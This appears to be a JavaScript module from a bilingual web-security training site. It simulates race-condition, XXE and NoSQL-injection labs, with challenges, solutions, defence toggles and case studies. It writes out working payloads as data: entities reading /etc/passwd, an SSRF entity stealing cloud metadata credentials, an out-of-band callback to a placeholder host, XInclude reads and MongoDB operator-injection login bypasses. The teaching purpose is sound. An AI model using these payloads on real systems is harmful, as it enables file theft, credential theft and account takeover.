import { L, decodeOnce, parseReq, verdict } from './lib.js';

const neutral = (en, zh) => ({ verdict: 'neutral', message: L(en, zh) });
const money = (c) => `$${(c / 100).toFixed(2)}`;
const JACKET = 133700;
const MODE = (def = 'parallel') => ({ id: 'mode', label: L('Send as (parallel / sequential)', '发送方式（parallel 并行 / sequential 顺序）'), default: def });
const isPar = (m) => /^par/i.test(m.trim());
const LOCK = { label: L('Server', '服务器'), off: L('Check, then update', '先检查，后更新'), on: L('Atomic / locked', '原子操作 / 加锁') };

/* ====================================================== Race conditions */
/** n requests: sequential → each sees the previous write. parallel → all checks happen before any write. */
function couponRace(n, parallel, atomic) {
  let price = JACKET;
  let applied = 0;
  for (let i = 0; i < n; i++) {
    const alreadyUsed = atomic || !parallel ? applied > 0 : false;
    if (!alreadyUsed) {
      price = Math.round(price * 0.8);
      applied++;
    }
  }
  return { price, applied };
}

function parseGroup(text) {
  return text
    .split('\n')
    .map((l) => l.trim())
    .filter(Boolean)
    .map((l) => {
      const [method = '', path = '', ...rest] = l.split(/\s+/);
      return { method: method.toUpperCase(), path, body: new URLSearchParams(rest.join('&')) };
    });
}

const race = {
  variants: [
    {
      id: 'overrun',
      title: L('Limit overrun', '突破次数限制'),
      summary: L('“Has this coupon been used?” and “mark it used” are two steps. Requests that arrive together all pass the check before any of them records the use.', '“这张券用过吗？”和“标记为已用”是两步操作。同时到达的请求，都会在任何一个记录使用之前通过检查。'),
      lab: {
        fields: [
          { id: 'n', label: L('Requests', '请求数'), default: '10' },
          MODE(),
        ],
        presets: [
          { label: L('10 sequential', '10 个顺序请求'), values: { n: '10', mode: 'sequential' } },
          { label: L('10 parallel', '10 个并行请求'), values: { n: '10', mode: 'parallel' } },
        ],
        defense: LOCK,
        run({ values, defended }) {
          const n = Math.min(Math.max(parseInt(values.n, 10) || 1, 1), 40);
          const r = couponRace(n, isPar(values.mode), defended);
          return { request: `${n} × POST /cart/coupon  coupon=PROMO20  (${isPar(values.mode) ? 'single packet' : 'one after another'})`, log: [L(`coupon applied ${r.applied} time(s)`, `优惠券被使用了 ${r.applied} 次`)], response: `Total: ${money(r.price)}`, ...(r.applied > 1 ? verdict(true, 'One-time coupon, applied many times.', '一次性优惠券被用了很多次。') : defended ? verdict(false, 'The check and the write are one atomic step.', '检查和写入是一个原子步骤。') : neutral('Each request sees the previous one: one use only.', '每个请求都能看到前一个的结果：只能用一次。')) };
        },
      },
      takeaway: L('HTTP/2 “single-packet attacks” make dozens of requests arrive within about a millisecond.', 'HTTP/2 的“单包攻击”能让几十个请求在大约 1 毫秒内同时到达。'),
    },
    {
      id: 'bruteforce',
      title: L('Rate-limit race', '频率限制竞争'),
      summary: L('A login limit counts failures after each attempt finishes. Send all guesses at once and they are all checked before the counter moves.', '登录限制是在每次尝试结束后才计数失败的。把所有猜测一次性发出，它们都会在计数器变化之前被检查。'),
      lab: {
        fields: [
          { id: 'n', label: L('Password guesses', '密码猜测数'), default: '20' },
          MODE(),
        ],
        presets: [
          { label: L('20 sequential', '20 个顺序'), values: { n: '20', mode: 'sequential' } },
          { label: L('20 parallel', '20 个并行'), values: { n: '20', mode: 'parallel' } },
        ],
        defense: LOCK,
        run({ values, defended }) {
          const n = Math.min(Math.max(parseInt(values.n, 10) || 1, 1), 50);
          const tried = defended || !isPar(values.mode) ? Math.min(n, 3) : n;
          const hit = tried >= 17;
          return { request: `${n} × POST /login  username=carlos&password=<list[i]>`, log: [L(`${tried} guesses evaluated before lockout (correct one is #17)`, `锁定前有 ${tried} 次猜测被验证（正确的是第 17 个）`)], response: hit ? 'HTTP/1.1 302 → /my-account' : 'HTTP/1.1 429 "Too many attempts"', ...(hit ? verdict(true, 'The limit was 3, but 20 guesses got through.', '限制是 3 次，却有 20 次猜测通过。') : defended ? verdict(false, 'The counter is incremented atomically before checking.', '计数器在检查前被原子地递增。') : neutral('Locked out after 3.', '3 次之后被锁定。')) };
        },
      },
    },
    {
      id: 'multi',
      title: L('Multi-endpoint race', '跨接口竞争'),
      summary: L('Checkout validates the cart, then places the order. If you add an item between those two moments, it ships without being paid for.', '结账先校验购物车，再下订单。如果你在这两个时刻之间加入商品，它就会在没付钱的情况下被发货。'),
      lab: {
        fields: [MODE()],
        presets: [
          { label: L('Sequential', '顺序'), values: { mode: 'sequential' } },
          { label: L('Parallel', '并行'), values: { mode: 'parallel' } },
        ],
        defense: { label: L('Checkout', '结账'), off: L('Validate, then read cart again', '校验后再次读取购物车'), on: L('Snapshot cart in one transaction', '在一个事务中快照购物车') },
        run({ values, defended }) {
          const par = isPar(values.mode);
          const won = par && !defended;
          return { request: 'POST /cart/checkout\nPOST /cart  productId=1 (jacket)', log: won ? [L('checkout validates cart: gift card $10 ≤ credit ✓', '结账校验购物车：礼品卡 $10 ≤ 余额 ✓'), L('jacket added', '加入了夹克'), L('order created from current cart: gift card + jacket', '根据当前购物车创建订单：礼品卡 + 夹克')] : [L('cart validated and ordered as one unit', '购物车的校验和下单作为一个整体完成')], response: won ? 'Order placed: Gift card, Lightweight jacket  (charged $10.00)' : 'Order placed: Gift card  (charged $10.00)', ...(won ? verdict(true, 'The jacket slipped in after validation.', '夹克在校验之后溜了进来。') : defended ? verdict(false, 'What was validated is exactly what is ordered.', '被校验的就是被下单的，分毫不差。') : neutral('Jacket added after the order: it goes into a new cart.', '夹克是在下单之后加入的：它进了一个新的购物车。')) };
        },
      },
    },
    {
      id: 'token',
      title: L('Colliding tokens', '令牌碰撞'),
      summary: L('Password-reset tokens derived from the timestamp are identical for two requests processed in the same millisecond, even for different users.', '由时间戳派生的密码重置令牌，在同一毫秒内处理的两个请求中是相同的，即使是不同的用户。'),
      lab: {
        fields: [MODE()],
        presets: [
          { label: L('Sequential', '顺序'), values: { mode: 'sequential' } },
          { label: L('Parallel', '并行'), values: { mode: 'parallel' } },
        ],
        defense: { label: L('Token', '令牌'), off: 'sha1(timestamp)', on: L('CSPRNG', '密码学安全随机数') },
        run({ values, defended }) {
          const par = isPar(values.mode);
          const t1 = defended ? 'c19a0e…' : par ? '5f2e1b…' : '5f2e1b…';
          const t2 = defended ? '7d03fa…' : par ? '5f2e1b…' : 'a90c44…';
          const same = t1 === t2;
          return { request: 'POST /forgot-password  username=wiener\nPOST /forgot-password  username=carlos', log: [L(`wiener’s token (emailed to you): ${t1}`, `wiener 的令牌（发到你的邮箱）：${t1}`), L(`carlos’s token: ${t2}`, `carlos 的令牌：${t2}`)], response: same ? 'GET /reset?user=carlos&token=5f2e1b… → 200 "Set new password"' : 'GET /reset?user=carlos&token=5f2e1b… → 400 "Invalid token"', ...(same ? verdict(true, 'Your token works for carlos.', '你的令牌对 carlos 也有效。') : defended ? verdict(false, 'Random tokens never collide.', '随机令牌不会碰撞。') : neutral('Different milliseconds, different tokens.', '不同毫秒，不同令牌。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Stack a one-time coupon', '叠加一次性优惠券'),
      goal: L('PROMO20 takes 20% off and can be used once. The jacket is $1337 and you have $50 of credit. Configure the attack so the jacket costs $50 or less.', 'PROMO20 打八折，只能用一次。夹克 $1337，你有 $50 余额。配置攻击，让夹克价格降到 $50 或以下。'),
      fields: [
        { id: 'n', label: L('Requests in the group (max 40)', '请求组中的请求数（最多 40）'), default: '1' },
        MODE('sequential'),
      ],
      run({ n, mode }) {
        const k = Math.min(Math.max(parseInt(n, 10) || 1, 1), 40);
        const r = couponRace(k, isPar(mode), false);
        return { log: [L(`applied ${r.applied}×`, `使用了 ${r.applied} 次`)], response: `Total: ${money(r.price)}`, price: r.price };
      },
      check: (v, o) => o.price <= 5000,
      hint: L('Sending them one by one never works. And 0.8ⁿ × 1337 ≤ 50 needs n ≥ 15.', '一个一个发永远不行。而 0.8ⁿ × 1337 ≤ 50 需要 n ≥ 15。'),
      solution: 'n = 15 (or more), mode = parallel',
      explain: L('The check (“is it used?”) and the write (“mark used”) were separate, and every parallel request fitted into the gap. Use a database constraint or a lock so only one can win.', '检查（“用过了吗？”）和写入（“标记已用”）是分开的，每个并行请求都挤进了这个空隙。用数据库约束或锁来保证只有一个能成功。'),
    },
    {
      title: L('Slip a jacket into checkout', '把夹克塞进结账'),
      goal: L('Your cart holds a $10 gift card and you have $50 credit. Write the request group (one request per line) so you receive the $1337 jacket. Requests: POST /cart productId=1 adds the jacket; POST /cart/checkout checks out.', '你的购物车里有一张 $10 礼品卡，余额 $50。写出请求组（每行一个请求），让你收到 $1337 的夹克。请求：POST /cart productId=1 加入夹克；POST /cart/checkout 结账。'),
      fields: [
        { id: 'g', label: L('Request group', '请求组'), rows: 3, default: 'POST /cart productId=1\nPOST /cart/checkout' },
        MODE('sequential'),
      ],
      run({ g, mode }) {
        const reqs = parseGroup(g);
        const add = reqs.findIndex((r) => r.method === 'POST' && r.path === '/cart' && r.body.get('productId') === '1');
        const co = reqs.findIndex((r) => r.method === 'POST' && r.path === '/cart/checkout');
        if (co < 0) return { log: [L('no checkout', '没有结账请求')], response: '(nothing ordered)', got: false };
        if (isPar(mode) && add >= 0) return { log: [L('checkout validated $10 ≤ $50 ✓, jacket landed before the order was written', '结账校验 $10 ≤ $50 ✓，夹克在订单写入之前加入')], response: 'Order placed: Gift card, Lightweight jacket (charged $10.00)', got: true };
        if (add >= 0 && add < co) return { log: [L('cart total $1347 > $50', '购物车总价 $1347 > $50')], response: 'HTTP/1.1 303 INSUFFICIENT_FUNDS', got: false };
        return { log: [], response: 'Order placed: Gift card (charged $10.00)', got: false };
      },
      check: (v, o) => o.got,
      hint: L('In sequence, either the jacket is validated (too expensive) or it arrives too late. Send both at once.', '按顺序发送时，要么夹克被校验（太贵），要么它来得太晚。把两个同时发出去。'),
      solution: 'POST /cart productId=1\nPOST /cart/checkout\nmode = parallel',
      explain: L('Validation and order creation read the cart at two different moments. Take one consistent snapshot (a transaction) and use it for both.', '校验和创建订单在两个不同的时刻读取了购物车。取一个一致的快照（事务），两步都用它。'),
    },
  ],
  cases: [
    { year: '2015', ref: L('Starbucks gift cards', '星巴克礼品卡'), title: L('Money from nothing', '无中生有的钱'), what: L('Researcher Egor Homakov showed that sending several simultaneous requests to transfer balance between Starbucks gift cards credited the target more than once, turning $15 into extra money. He reported it to Starbucks.', '研究员 Egor Homakov 演示了：同时发送多个在星巴克礼品卡之间转移余额的请求，会让目标卡被多次入账，把 $15 变成更多的钱。他把问题报告给了星巴克。'), lesson: L('Any “check balance, then move money” flow needs locking or atomic updates.', '任何“先查余额，再转账”的流程都需要加锁或原子更新。') },
    { year: '2016', ref: 'CVE-2016-5195', title: L('Dirty COW (beyond the web)', 'Dirty COW（Web 之外）'), what: L('A race condition in the Linux kernel’s copy-on-write handling let an unprivileged local user write to read-only files and gain root. It had existed for about nine years and was exploited in the wild.', 'Linux 内核写时复制（copy-on-write）处理中的一个竞争条件，允许无特权的本地用户写入只读文件并获取 root 权限。它存在了大约九年，并在实际攻击中被利用。'), lesson: L('Races are a class of bug at every layer, not just web apps.', '竞争条件是每一层都会出现的一类漏洞，不只是 Web 应用。') },
  ],
};

/* ====================================================== XXE */
const XFILES = { '/etc/passwd': 'root:x:0:0:root:/root:/bin/bash\nwww-data:x:33:33::/var/www:/usr/sbin/nologin', '/etc/hostname': 'shop-web-7' };
const META = {
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/': 'shop-ec2-role',
  'http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role': '{"AccessKeyId":"ASIA…EXAMPLE","SecretAccessKey":"xXe9…METADATA"}',
};
function fetchUri(uri) {
  if (uri.startsWith('file://')) return XFILES[uri.slice(7)] ?? null;
  if (META[uri] !== undefined) return META[uri];
  if (/^http:\/\/169\.254\.169\.254\/latest\/meta-data\/?$/.test(uri)) return 'iam/';
  if (/^http:\/\/169\.254\.169\.254\/latest\/meta-data\/iam\/?$/.test(uri)) return 'security-credentials/';
  return null;
}
/** A deliberately small XML "parser" that expands external entities the way a misconfigured one would. */
function parseXml(xml, { external = true } = {}) {
  const log = [];
  const oob = [];
  const ents = {};
  const dtd = /<!DOCTYPE[^[]*\[([\s\S]*?)\]>/i.exec(xml);
  if (dtd) {
    for (const m of dtd[1].matchAll(/<!ENTITY\s+(%\s+)?(\w+)\s+SYSTEM\s+["']([^"']+)["']\s*>/gi)) {
      const param = Boolean(m[1]);
      if (!external) {
        log.push(L(`🛡 external entity ${m[2]} ignored`, `🛡 忽略外部实体 ${m[2]}`));
        continue;
      }
      if (/\.oast\.example/.test(m[3])) oob.push(m[3]);
      const v = fetchUri(m[3]);
      log.push(L(`entity ${param ? '%' : '&'}${m[2]} ← ${m[3]}${v === null ? ' (nothing)' : ''}`, `实体 ${param ? '%' : '&'}${m[2]} ← ${m[3]}${v === null ? '（无内容）' : ''}`));
      if (!param) ents[m[2]] = v ?? '';
    }
    for (const m of dtd[1].matchAll(/<!ENTITY\s+(\w+)\s+["']([^"']*)["']\s*>/gi)) ents[m[1]] = m[2];
  }
  const body = xml.replace(/<!DOCTYPE[\s\S]*?\]>/i, '');
  const inc = /<xi:include[^>]*parse=["']text["'][^>]*href=["']([^"']+)["'][^>]*\/>/i.exec(body);
  const xinc = inc && /xmlns:xi=["']http:\/\/www\.w3\.org\/2001\/XInclude["']/i.test(body) ? (external ? fetchUri(inc[1]) : null) : null;
  if (inc) log.push(external ? L(`XInclude ← ${inc[1]}`, `XInclude ← ${inc[1]}`) : L('🛡 XInclude disabled', '🛡 XInclude 已禁用'));
  const pid = /<productId>([\s\S]*?)<\/productId>/i.exec(body);
  let value = pid ? pid[1] : xinc ?? '';
  value = value.replace(/&(\w+);/g, (m, n) => (n in ents ? ents[n] : m));
  if (xinc !== null && !pid) value = xinc;
  else if (xinc !== null) value = value.replace(/<xi:include[\s\S]*?\/>/i, xinc);
  return { value, log, oob };
}
const stockXml = (inner, dtd = '') => `<?xml version="1.0"?>${dtd}\n<stockCheck><productId>${inner}</productId><storeId>1</storeId></stockCheck>`;
const xxeResp = (v) => (/^\d+$/.test(v.trim()) ? 'HTTP/1.1 200 OK\n\n421 units' : `HTTP/1.1 400\n\n"Invalid product ID: ${v}"`);
const NOEXT = { label: L('XML parser', 'XML 解析器'), off: L('External entities on', '启用外部实体'), on: L('DTDs / external entities off', '禁用 DTD / 外部实体') };

const xxe = {
  variants: [
    {
      id: 'file',
      title: L('Retrieve files', '读取文件'),
      summary: L('Define an external entity pointing at a file, then use it in a value the app echoes back.', '定义一个指向文件的外部实体，然后在应用会回显的值里引用它。'),
      lab: {
        fields: [{ id: 'x', label: 'XML', rows: 5, default: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>') }],
        presets: [
          { label: L('Normal', '正常'), values: { x: stockXml('1') } },
          { label: 'file:///etc/passwd', values: { x: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>') } },
        ],
        defense: NOEXT,
        run({ values, defended }) {
          const r = parseXml(values.x, { external: !defended });
          const leaked = /root:x:0:0/.test(r.value);
          return { request: `POST /product/stock\nContent-Type: application/xml\n\n${values.x}`, log: r.log, response: xxeResp(r.value), ...(leaked ? verdict(true, 'The error message echoed the file.', '错误信息把文件内容回显了出来。') : defended ? verdict(false, 'The entity is never resolved.', '实体根本不会被解析。') : neutral('Normal stock check.', '正常的库存查询。')) };
        },
      },
    },
    {
      id: 'ssrf',
      title: L('XXE to SSRF', '从 XXE 到 SSRF'),
      summary: L('An external entity can be an http:// URL. The parser fetches it from inside the network, cloud metadata included.', '外部实体也可以是 http:// URL。解析器会从内网里去请求它，包括云元数据。'),
      lab: {
        fields: [{ id: 'x', label: 'XML', rows: 5, default: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>') }],
        presets: [
          { label: 'meta-data/', values: { x: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>') } },
          { label: 'security-credentials/', values: { x: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/"> ]>') } },
        ],
        defense: NOEXT,
        run({ values, defended }) {
          const r = parseXml(values.x, { external: !defended });
          const leaked = /SecretAccessKey|shop-ec2-role/.test(r.value);
          return { request: `POST /product/stock\n\n${values.x}`, log: r.log, response: xxeResp(r.value), ...(leaked ? verdict(true, 'Internal metadata, fetched by the XML parser.', 'XML 解析器替你取回了内部元数据。') : defended ? verdict(false, 'No fetch.', '没有发出请求。') : neutral('Keep walking the tree.', '继续沿着目录走。')) };
        },
      },
    },
    {
      id: 'blind',
      title: L('Blind, out-of-band', '盲 XXE（带外）'),
      summary: L('When nothing is echoed, a parameter entity (%) pointing at your server proves the parser fetches external resources.', '当什么都不回显时，用一个指向你服务器的参数实体（%）来证明解析器会请求外部资源。'),
      lab: {
        fields: [{ id: 'x', label: 'XML', rows: 4, default: stockXml('1', '\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://k3x9.oast.example"> %xxe; ]>') }],
        presets: [{ label: L('Parameter entity', '参数实体'), values: { x: stockXml('1', '\n<!DOCTYPE foo [ <!ENTITY % xxe SYSTEM "http://k3x9.oast.example"> %xxe; ]>') } }],
        defense: NOEXT,
        run({ values, defended }) {
          const r = parseXml(values.x, { external: !defended });
          return { request: `POST /product/stock\n\n${values.x}`, log: [...r.log, ...r.oob.map((u) => L(`📡 your listener: HTTP request to ${u}`, `📡 你的监听器：收到对 ${u} 的 HTTP 请求`))], response: 'HTTP/1.1 200 OK\n\n"XML parsing error"', ...(r.oob.length ? verdict(true, 'The callback proves XXE even though nothing came back.', '尽管什么都没返回，回连证明了 XXE 的存在。') : defended ? verdict(false, 'No callback.', '没有回连。') : neutral('No callback.', '没有回连。')) };
        },
      },
      takeaway: L('With an external DTD on your server, blind XXE can also exfiltrate file contents in the URL.', '借助你服务器上的外部 DTD，盲 XXE 还能把文件内容放进 URL 带出来。'),
    },
    {
      id: 'xinclude',
      title: L('XInclude', 'XInclude'),
      summary: L('Sometimes your input is placed inside a server-built XML document, so you can’t add a DOCTYPE. XInclude works from inside an element.', '有时你的输入被放进服务器构造的 XML 文档里，你没法添加 DOCTYPE。XInclude 可以在元素内部生效。'),
      lab: {
        fields: [{ id: 'p', label: 'productId', default: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>' }],
        presets: [
          { label: '1', values: { p: '1' } },
          { label: 'XInclude', values: { p: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>' } },
        ],
        defense: NOEXT,
        run({ values, defended }) {
          const xml = stockXml(values.p);
          const r = parseXml(xml, { external: !defended });
          const v = r.value.replace(/<\/?foo[^>]*>/g, '');
          return { request: `POST /product/stock\n\nproductId=${values.p}&storeId=1`, log: [L('server builds the XML around your value', '服务器用你的值构造 XML'), ...r.log], response: xxeResp(v), ...(/root:x/.test(v) ? verdict(true, 'No DOCTYPE needed.', '无需 DOCTYPE。') : defended ? verdict(false, 'XInclude processing is off.', 'XInclude 处理已关闭。') : neutral('Normal.', '正常。')) };
        },
      },
    },
  ],
  challenges: [
    {
      title: L('Read /etc/passwd', '读取 /etc/passwd'),
      goal: L('The stock checker parses your XML and echoes an invalid productId in the error. Make it show /etc/passwd.', '库存查询会解析你的 XML，并在错误信息中回显无效的 productId。让它显示 /etc/passwd。'),
      fields: [{ id: 'x', label: 'XML', rows: 4, default: stockXml('1') }],
      run({ x }) {
        const r = parseXml(x);
        return { log: r.log, response: xxeResp(r.value), v: r.value };
      },
      check: (v, o) => /root:x:0:0/.test(o.v),
      hint: L('Add <!DOCTYPE foo [ <!ENTITY name SYSTEM "file:///…"> ]> after the XML declaration, then use &name; as the productId.', '在 XML 声明之后加上 <!DOCTYPE foo [ <!ENTITY name SYSTEM "file:///…"> ]>，然后把 &name; 作为 productId。'),
      solution: '<?xml version="1.0"?>\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "file:///etc/passwd"> ]>\n<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>',
      explain: L('XML’s entity feature was designed to pull in external content, and many parsers enabled it by default. Disable DTDs (or at least external entities) in the parser configuration.', 'XML 的实体功能本来就是设计用来引入外部内容的，很多解析器默认启用它。在解析器配置中禁用 DTD（至少禁用外部实体）。'),
    },
    {
      title: L('Without a DOCTYPE', '没有 DOCTYPE'),
      goal: L('Now you only control the productId value; the server builds the XML. Read /etc/passwd.', '现在你只能控制 productId 的值，XML 由服务器构造。读取 /etc/passwd。'),
      fields: [{ id: 'p', label: 'productId', default: '1' }],
      run({ p }) {
        const r = parseXml(stockXml(p));
        const v = r.value.replace(/<\/?foo[^>]*>/g, '');
        return { log: r.log, response: xxeResp(v), v };
      },
      check: (v, o) => /root:x:0:0/.test(o.v),
      hint: L('Use an XInclude element with parse="text" and the XInclude namespace declared on a wrapper element.', '使用带 parse="text" 的 XInclude 元素，并在外层元素上声明 XInclude 命名空间。'),
      solution: '<foo xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include parse="text" href="file:///etc/passwd"/></foo>',
      explain: L('XInclude is a separate feature from DTD entities and must be disabled separately. Treat every XML feature that loads external resources as dangerous.', 'XInclude 是独立于 DTD 实体的功能，必须单独禁用。把每一个会加载外部资源的 XML 功能都视为危险。'),
    },
    {
      title: L('Steal the cloud secret', '偷出云密钥'),
      goal: L('Use XXE as SSRF against http://169.254.169.254/latest/meta-data/. Find the IAM role name, then get its SecretAccessKey and paste it below.', '把 XXE 当作 SSRF，攻击 http://169.254.169.254/latest/meta-data/。找到 IAM 角色名，再拿到它的 SecretAccessKey 并粘贴到下方。'),
      fields: [
        { id: 'x', label: 'XML', rows: 4, default: stockXml('&xxe;', '\n<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/"> ]>') },
        { id: 'a', label: 'SecretAccessKey', default: '' },
      ],
      run({ x, a }) {
        const r = parseXml(x);
        return { log: [...r.log, a ? (a.trim() === 'xXe9…METADATA' ? L('✓ correct', '✓ 正确') : L('✗ wrong', '✗ 不对')) : ''].filter(Boolean), response: xxeResp(r.value) };
      },
      check: (v) => v.a.trim() === 'xXe9…METADATA',
      hint: L('Walk: meta-data/ → iam/ → security-credentials/ → <role name>.', '路径：meta-data/ → iam/ → security-credentials/ → <角色名>。'),
      solution: 'SYSTEM "http://169.254.169.254/latest/meta-data/iam/security-credentials/shop-ec2-role"  →  xXe9…METADATA',
      explain: L('XXE is an SSRF primitive too. Disabling external entities fixes both; IMDSv2 limits the blast radius.', 'XXE 同样是一种 SSRF 手段。禁用外部实体能同时修复两者；IMDSv2 能限制损害范围。'),
    },
  ],
  cases: [
    { year: '2014', ref: L('Google (Detectify)', 'Google（Detectify）'), title: L('Reading files on a Google server', '读取 Google 服务器上的文件'), what: L('Researchers at Detectify found that a Google Toolbar button gallery feature accepted uploaded XML and resolved external entities, letting them read files such as /etc/passwd from a Google production server. Google paid a $10,000 bounty.', 'Detectify 的研究人员发现，Google 工具栏按钮库的一个功能接受上传的 XML 并解析外部实体，使他们能从 Google 的生产服务器上读取 /etc/passwd 等文件。Google 支付了 1 万美元赏金。'), lesson: L('Any feature that accepts XML, even an obscure one, needs a hardened parser.', '任何接受 XML 的功能，哪怕是冷门的，都需要加固过的解析器。') },
    { year: '2014', ref: L('Facebook (Reginaldo Silva)', 'Facebook（Reginaldo Silva）'), title: L('XXE in OpenID handling', 'OpenID 处理中的 XXE'), what: L('Reginaldo Silva found an XXE flaw in how Facebook processed OpenID data, which could be used to read files from Facebook servers and potentially reach remote code execution. Facebook paid $33,500, one of its largest bounties at the time.', 'Reginaldo Silva 发现 Facebook 处理 OpenID 数据的方式存在 XXE 漏洞，可被用来读取 Facebook 服务器上的文件，并可能进一步实现远程代码执行。Facebook 支付了 33,500 美元，是当时最高额的赏金之一。'), lesson: L('XML hides inside protocols (OpenID, SAML, SOAP, Office files, SVG).', 'XML 藏身于各种协议之中（OpenID、SAML、SOAP、Office 文件、SVG）。') },
  ],
};

/* ====================================================== NoSQL injection */
const MUSERS = [
  { username: 'wiener', password: 'peter', role: 'user' },
  { username: 'carlos', password: 'montoya', role: 'user' },
  { username: 'administrator', password: 'v8Qp2xL', role: 'admin' },
  { username: 'admin7f2c', password: 'k1Lm9q', role: 'admin' },
];
/** Evaluate a Mongo-style value condition. */
function matchCond(field, cond) {
  if (cond === null || typeof cond !== 'object') return field === cond;
  return Object.entries(cond).every(([op, v]) => {
    if (op === '$ne') return field !== v;
    if (op === '$gt') return field > v;
    if (op === '$in') return Array.isArray(v) && v.includes(field);
    if (op === '$regex') {
      try {
        return new RegExp(v).test(field);
      } catch {
        return false;
      }
    }
    return false;
  });
}
function mongoLogin(body, { strict = false } = {}) {
  let j;
  try {
    j = JSON.parse(body);
  } catch {
    return { err: 'HTTP/1.1 400 "Invalid JSON"' };
  }
  if (strict && (typeof j.username !== 'string' || typeof j.password !== 'string')) return { err: 'HTTP/1.1 400 "username and password must be strings"', blocked: true };
  const u = MUSERS.find((x) => matchCond(x.username, j.username) && matchCond(x.password, j.password));
  return { user: u, query: `db.users.findOne(${JSON.stringify({ username: j.username, password: j.password })})` };
}
const PRODUCTS = [
  { name: 'Beach ball', category: 'Gifts', released: 1 },
  { name: 'Snow globe', category: 'Gifts', released: 1 },
  { name: 'Prototype drone', category: 'Gifts', released: 0 },
];
/** $where with string concatenation: this.category == 'INPUT' && this.released == 1 */
function whereFilter(cat) {
  const js = `this.category == '${cat}' && this.released == 1`;
  // Evaluate the three shapes learners use, without eval.
  const tautology = /'\s*\|\|\s*'1'\s*==\s*'1$/.test(cat) || /'\s*\|\|\s*1\s*\|\|\s*'$/.test(cat) || /'\s*\|\|\s*true\s*\|\|\s*'$/.test(cat);
  const nul = /'\s*%00$/.test(cat) || cat.includes('\0');
  const base = cat.split("'")[0];
  if (cat.includes("'") && !tautology && !nul) return { js, err: true };
  const rows = PRODUCTS.filter((p) => (tautology ? true : p.category === base && (nul || p.released === 1)));
  return { js, rows };
}
const STRICT = { label: L('Input types', '输入类型'), off: L('Anything JSON allows', 'JSON 允许的任何类型'), on: L('Strings only (schema)', '只允许字符串（schema）') };

const nosqli = {
  variants: [
    {
      id: 'syntax',
      title: L('Syntax injection ($where)', '语法注入（$where）'),
      summary: L('The app builds a JavaScript condition for MongoDB’s $where by concatenation. Break out of the string, just like SQLi.', '应用通过字符串拼接为 MongoDB 的 $where 构造 JavaScript 条件。像 SQL 注入一样逃出字符串。'),
      lab: {
        fields: [{ id: 'c', label: 'category', default: "Gifts'||'1'=='1" }],
        presets: [
          { label: 'Gifts', values: { c: 'Gifts' } },
          { label: "Gifts'", values: { c: "Gifts'" } },
          { label: "'||'1'=='1", values: { c: "Gifts'||'1'=='1" } },
        ],
        defense: { label: L('Query', '查询'), off: L('$where string', '$where 字符串'), on: L('Plain field match', '普通字段匹配') },
        run({ values, defended }) {
          const request = `GET /filter?category=${values.c}`;
          if (defended) {
            const rows = PRODUCTS.filter((p) => p.category === values.c && p.released === 1);
            return { request, log: [`db.products.find({ category: ${JSON.stringify(values.c)}, released: 1 })`], response: rows.map((r) => r.name).join('\n') || '(none)', ...verdict(false, 'No code is evaluated.', '没有代码被执行。') };
          }
          const r = whereFilter(values.c);
          if (r.err) return { request, log: [`$where: ${r.js}`], response: 'HTTP/1.1 500\n\nSyntaxError: unterminated string literal', ...neutral('A syntax error: injection is likely.', '语法错误：很可能存在注入。') };
          const hidden = r.rows.some((p) => !p.released);
          return { request, log: [`$where: ${r.js}`], response: r.rows.map((p) => p.name).join('\n') || '(none)', ...(hidden ? verdict(true, 'Unreleased products are shown.', '显示了未发布的商品。') : neutral('Normal.', '正常。')) };
        },
      },
    },
    {
      id: 'operator',
      title: L('Operator injection', '操作符注入'),
      summary: L('If the app passes your JSON straight into the query, an object like {"$ne": ""} replaces a value with a condition.', '如果应用把你的 JSON 直接传进查询，像 {"$ne": ""} 这样的对象就会把“值”变成“条件”。'),
      lab: {
        fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 2, default: '{"username":"wiener","password":{"$ne":""}}' }],
        presets: [
          { label: L('Correct', '正确密码'), values: { b: '{"username":"wiener","password":"peter"}' } },
          { label: '$ne', values: { b: '{"username":"wiener","password":{"$ne":""}}' } },
        ],
        defense: STRICT,
        run({ values, defended }) {
          const r = mongoLogin(values.b, { strict: defended });
          if (r.err) return { request: `POST /login\n\n${values.b}`, log: [], response: r.err, ...(r.blocked ? verdict(false, 'Objects are rejected before reaching the database.', '对象在到达数据库之前就被拒绝了。') : neutral('Bad JSON.', 'JSON 格式错误。')) };
          const op = /"\$/.test(values.b);
          return { request: `POST /login\n\n${values.b}`, log: [r.query], response: r.user ? `HTTP/1.1 302 → /my-account?id=${r.user.username}` : 'HTTP/1.1 200 "Invalid username or password"', ...(r.user && op ? verdict(true, `Logged in as ${r.user.username} without the password.`, `没用密码就以 ${r.user.username} 身份登录了。`) : neutral(r.user ? 'Normal login.' : 'Failed.', r.user ? '正常登录。' : '失败。')) };
        },
      },
    },
    {
      id: 'regex',
      title: L('$regex for unknown names', '用 $regex 匹配未知名字'),
      summary: L('Don’t know the admin’s exact username? A regular expression matches it for you.', '不知道管理员的确切用户名？正则表达式会替你匹配。'),
      lab: {
        fields: [{ id: 'b', label: L('JSON body', 'JSON 请求体'), rows: 2, default: '{"username":{"$regex":"^admin"},"password":{"$ne":""}}' }],
        presets: [
          { label: 'admin', values: { b: '{"username":"admin","password":{"$ne":""}}' } },
